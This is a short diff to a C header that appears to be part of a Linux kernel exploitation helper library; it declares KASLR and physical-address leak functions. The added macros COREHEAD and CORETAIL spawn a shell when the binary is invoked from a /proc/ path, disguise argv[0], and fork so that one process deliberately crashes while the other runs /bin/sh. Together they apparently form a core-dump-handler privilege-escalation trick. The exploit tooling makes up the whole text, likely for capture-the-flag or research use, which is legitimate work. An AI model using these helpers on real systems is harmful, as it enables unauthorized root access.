@@ -113,6 +113,24 @@ typedef struct
     exit(-ELIBX); \
 }
 
+#define COREHEAD(argv) \
+    do { \
+        if (strncmp((argv)[0], "/proc/", 6) == 0) { \
+            coreShell(0); \
+        } else { \
+            strncpy((argv)[0], "n132", strlen((argv)[0])); \
+            (argv)[0][strlen("n132")] = '\0'; \
+        } \
+    } while (0)
+#define CORETAIL(value) \
+    do { \
+        if (fork()) { \
+            crash(value); \
+        } else { \
+            system("/bin/sh"); \
+        } \
+    } while (0)
+
 // Externel funcs
 extern size_t           leakKASLR();
 extern size_t           leakPHYS();
